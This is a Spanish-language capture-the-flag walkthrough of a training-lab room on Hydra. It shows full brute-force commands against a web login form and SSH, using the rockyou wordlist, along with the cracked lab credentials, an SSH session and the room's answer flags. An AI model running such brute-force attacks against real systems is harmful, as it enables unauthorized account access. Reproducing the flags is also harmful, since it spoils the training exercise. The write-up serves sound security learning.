### Task 1 - Hydra Introduction

En este apartado solo se revisa la teoría, por lo que no hay actividad extra por hacer, pasando a la tarea 2.
### Task 2 - Using Hydra

Después de arrancar la máquina, nos otorga la siguiente IP:

```
10.201.54.132
```

Ahora que también se desplegó la AttackBox, abrimos el navegador Firefox y procedemos a colocar en la barra de búsqueda la IP que nos brindaron, al cargar la página, nos encontramos con un inicio de sesión, donde nos pide el usuario y contraseña.

Por lo que después de revisar toda la teoría, se determina que lo mejor que se puede hacer es usar la herramienta de inspección en el apartado de red, se decide probar con un usuario y contraseña aleatoria, para analizar el tráfico de red que hay al momento de querer iniciar sesión. Para esto se usa lo siguiente:

```
usuario = admin
password = 1234
```

Una vez que nos marca que los datos (ya sea el usuario, la contraseña o ambos) son incorrectos, se decide revisar el login con el método POST, donde al hacer clic en él, nos pasamos a la respuesta y encontramos algo semejante a la teoría que nos explica lo de las credenciales de login, por lo que tenemos lo siguiente:

```
username=admin&password=1234
```

Inspeccionando un poco más, tenemos que el protocolo de Hydra que está manejando la página es un HTTP-FORM-POST, por lo que una vez que sabemos sobre que estamos trabajando, procedemos a abrir una ventana de terminal, donde ingresaremos el siguiente comando: `hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.54.132 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -v`, con lo cual obtenemos la siguiente salida:

```shell
root@ip-10-201-73-101:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.54.132 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -v
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-23 00:06:11
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.201.54.132:80/login:username=^USER^&password=^PASS^:F=incorrect
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[80][http-post-form] host: 10.201.54.132   login: molly   password: sunshine
[STATUS] attack finished for 10.201.54.132 (waiting for children to complete tests)
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
[VERBOSE] Page redirected to http://10.201.54.132/login
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-23 00:06:29
```

Como podemos ver, nos arroja un usuario y contraseña exitosos, por lo que procedemos a ingresarlos en el inicio de sesión.

Al ser correctos, nos deja acceder y nos muestra una bandera, siendo la siguiente:

```flag
THM{2673a7dd116de68e85c48ec0b1f2612e}
```

Para el caso de la pregunta dos, nos pide forzar la contraseña SSH para Molly, por lo que revisando la teoría una vez más, tenemos que el comando para lograr esto es: `hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.54.132 -t4 ssh`, con el cual ahora obtenemos la siguiente salida:

```shell
root@ip-10-201-73-101:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.54.132 -t4 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-23 00:08:34
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://10.201.54.132:22/
[22][ssh] host: 10.201.54.132   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-23 00:09:29
```

Obteniendo ahora la contraseña SSH de Molly, por lo cual procedemos a probarlo en la terminal con el siguiente comando: `ssh molly@10.201.54.132`, resultando en lo siguiente:

```shell
root@ip-10-201-73-101:~# ssh molly@10.201.54.132
The authenticity of host '10.201.54.132 (10.201.54.132)' can't be established.
ECDSA key fingerprint is SHA256:XYI4H2F0uzwlMVI+2onRPqZzn/ntOPyCbRKngN14mVc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.201.54.132' (ECDSA) to the list of known hosts.
molly@10.201.54.132's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1083-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 22 Oct 2025 11:10:39 PM UTC

  System load:  0.04               Processes:             108
  Usage of /:   18.3% of 14.47GB   Users logged in:       0
  Memory usage: 20%                IPv4 address for ens5: 10.201.54.132
  Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

7 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
```

Ahora ingresamos la contraseña y procedemos con lo siguiente, donde ya cambiamos de usuario root al usuario molly:

```shell
molly@ip-10-201-54-132:~$ 
```

Revisamos el contenido del fichero donde nos encontramos con el comando **ls**:

```shell
molly@ip-10-201-54-132:~$ ls
flag2.txt
```

Por último, hacemos un **cat** para revisar el contenido del archivo flag2.txt, obtenido la bandera 2 del reto:

```shell
molly@ip-10-201-54-132:~$ cat flag2.txt
THM{c8eeb0468febbadea859baeb33b2541b}
```

Por lo que ahora continuamos a responder las preguntas del reto.
#### Pregunta 1:

Aquí se nos pide: **Usa Hydra para forzar la contraseña web de Molly. ¿Cuál es la bandera 1?**

Respuesta:

```respuesta
THM{2673a7dd116de68e85c48ec0b1f2612e}
```
#### Pregunta 2:

Ahora se nos pide: **Usa Hydra para forzar la contraseña SSH de Molly. ¿Cuál es la bandera 2?**

Respuesta:

```respuesta
THM{c8eeb0468febbadea859baeb33b2541b}
```

Con lo cuál hemos concluido con el room de forma correcta.